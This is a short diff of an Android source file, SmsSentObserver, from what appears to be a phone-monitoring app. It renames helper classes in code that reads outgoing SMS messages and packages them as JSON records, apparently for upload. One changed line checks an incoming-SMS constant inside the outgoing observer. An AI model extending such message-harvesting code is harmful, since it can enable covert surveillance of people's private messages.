@@ -10,11 +10,11 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 
-import com.inet.android.request.ConstantRequest;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.DataRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WhileTheMethod;
+import com.inet.android.utils.ValueWork;
 
 /**
  * SmsSentObserver class is design for monitoring outgoing sms
@@ -53,7 +53,7 @@ public class SmsSentObserver extends ContentObserver {
 		try {
 			Logging.doLog(TAG, "Notification on SMS observer",
 					"Notification on SMS observer");
-			if (WhileTheMethod.getState(2, mContext) == 0)
+			if (ValueWork.getState(ConstantValue.TYPE_INCOMING_SMS_REQUEST, mContext) == 0)
 				return;
 			Cursor sms_sent_cursor = mContext.getContentResolver().query(
 					STATUS_URI, null, null, null, null);
@@ -110,7 +110,7 @@ public class SmsSentObserver extends ContentObserver {
 									object.put("time", ConvertDate.logTime());
 									object.put(
 											"type",
-											ConstantRequest.TYPE_OUTGOING_SMS_REQUEST);
+											ConstantValue.TYPE_OUTGOING_SMS_REQUEST);
 									object.put("info", info);
 									data.put(object);
 									jsonObject.put("data", data);
